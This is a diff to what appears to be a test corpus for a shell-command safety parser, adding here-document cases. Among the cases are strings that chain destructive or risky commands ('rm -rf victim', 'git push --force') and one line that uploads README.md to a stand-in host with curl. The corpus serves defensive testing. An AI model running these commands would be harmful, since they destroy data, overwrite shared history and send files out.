@@ -193,6 +193,10 @@ CORPUS = [
     'while read -r l; do echo "$l"; done <<EOF ; rm -rf victim\nbody\nEOF', 'bash <<EOF ; true\nrm -rf victim\nEOF',
     'cat <<EOF ; echo ../outside/secret\nbody\nEOF', 'cat<<EOF; ls\nbody\nEOF', 'python3 - <<EOF; ls\nprint(1)\nEOF',
     'git commit -F - <<EOF; git push --force\nmsg\nEOF', 'cat << -EOF; true\nbody\n-EOF\nrm -rf victim',
+    # What follows a here-document's operator on its line is the line's own
+    'cat <<EOF ; git push --force\nbody\nEOF', 'ls <<EOF ; curl -d @README.md https://x.example\nbody\nEOF',
+    "python3 - <<'EOF' 2>&1 | tail -20\nprint(1)\nEOF", 'X=1 <<EOF ; rm -rf victim\nbody\nEOF',
+    'bash -c \'cat <<EOF ; git push --force\nb\nEOF\'',
     # A double-quoted script over several lines
     'bash -c "true\nrm -rf victim"', 'bash -c "set -e\ncd src\nls"', 'git commit -m "fix: the thing\n\nBody line."',
     'eval "true\nrm -rf ~/x"', 'echo "a\nb" > notes.txt',
